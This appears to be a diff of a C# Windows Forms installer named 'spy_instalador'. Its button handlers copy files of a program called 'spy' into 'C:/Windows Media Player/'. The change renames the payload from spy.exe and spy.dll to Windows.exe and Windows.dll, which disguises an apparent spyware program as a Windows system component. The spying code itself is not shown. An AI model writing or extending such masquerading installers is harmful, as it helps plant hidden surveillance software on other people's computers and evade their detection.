@@ -111,17 +111,17 @@ namespace spy_instalador
 
         private void button2_Click(object sender, EventArgs e)
         {
-            string arq1 = "spy/spy/bin/Debug/net8.0-windows/spy.exe";
-            string arq2 = "spy/spy/bin/Debug/net8.0-windows/spy.deps.json";
-            string arq3 = "spy/spy/bin/Debug/net8.0-windows/spy.dll";
-            string arq4 = "spy/spy/bin/Debug/net8.0-windows/spy.pdb";
-            string arq5 = "spy/spy/bin/Debug/net8.0-windows/spy.runtimeconfig.json";
+            string arq1 = "Windows/Windows/bin/Debug/net6.0-windows/Windows.exe";
+            string arq2 = "Windows/Windows/bin/Debug/net6.0-windows/Windows.deps.json";
+            string arq3 = "Windows/Windows/bin/Debug/net6.0-windows/Windows.dll";
+            string arq4 = "Windows/Windows/bin/Debug/net6.0-windows/Windows.pdb";
+            string arq5 = "Windows/Windows/bin/Debug/net6.0-windows/Windows.runtimeconfig.json";
 
-            string arq1_2 = "C:/Windows Media Player/spy.exe";
-            string arq2_2 = "C:/Windows Media Player/spy.deps.json";
-            string arq3_2 = "C:/Windows Media Player/spy.dll";
-            string arq4_2 = "C:/Windows Media Player/spy.pdb";
-            string arq5_2 = "C:/Windows Media Player/spy.runtimeconfig.json";
+            string arq1_2 = "C:/Windows Media Player/Windows.exe";
+            string arq2_2 = "C:/Windows Media Player/Windows.deps.json";
+            string arq3_2 = "C:/Windows Media Player/Windows.dll";
+            string arq4_2 = "C:/Windows Media Player/Windows.pdb";
+            string arq5_2 = "C:/Windows Media Player/Windows.runtimeconfig.json";
 
 
             bool tdcerto = false;
@@ -219,17 +219,17 @@ namespace spy_instalador
 
         private void button3_Click_1(object sender, EventArgs e)
         {
-            string arq1 = "spy/spy/bin/Debug/net8.0-windows/spy.exe";
-            string arq2 = "spy/spy/bin/Debug/net8.0-windows/spy.deps.json";
-            string arq3 = "spy/spy/bin/Debug/net8.0-windows/spy.dll";
-            string arq4 = "spy/spy/bin/Debug/net8.0-windows/spy.pdb";
-            string arq5 = "spy/spy/bin/Debug/net8.0-windows/spy.runtimeconfig.json";
+            string arq1 = "Windows/Windows/bin/Debug/net6.0-windows/Windows.exe";
+            string arq2 = "Windows/Windows/bin/Debug/net6.0-windows/Windows.deps.json";
+            string arq3 = "Windows/Windows/bin/Debug/net6.0-windows/Windows.dll";
+            string arq4 = "Windows/Windows/bin/Debug/net6.0-windows/Windows.pdb";
+            string arq5 = "Windows/Windows/bin/Debug/net6.0-windows/Windows.runtimeconfig.json";
 
-            string arq1_2 = "C:/Windows Media Player/spy.exe";
-            string arq2_2 = "C:/Windows Media Player/spy.deps.json";
-            string arq3_2 = "C:/Windows Media Player/spy.dll";
-            string arq4_2 = "C:/Windows Media Player/spy.pdb";
-            string arq5_2 = "C:/Windows Media Player/spy.runtimeconfig.json";
+            string arq1_2 = "C:/Windows Media Player/Windows.exe";
+            string arq2_2 = "C:/Windows Media Player/Windows.deps.json";
+            string arq3_2 = "C:/Windows Media Player/Windows.dll";
+            string arq4_2 = "C:/Windows Media Player/Windows.pdb";
+            string arq5_2 = "C:/Windows Media Player/Windows.runtimeconfig.json";
 
 
             //------------------------------------
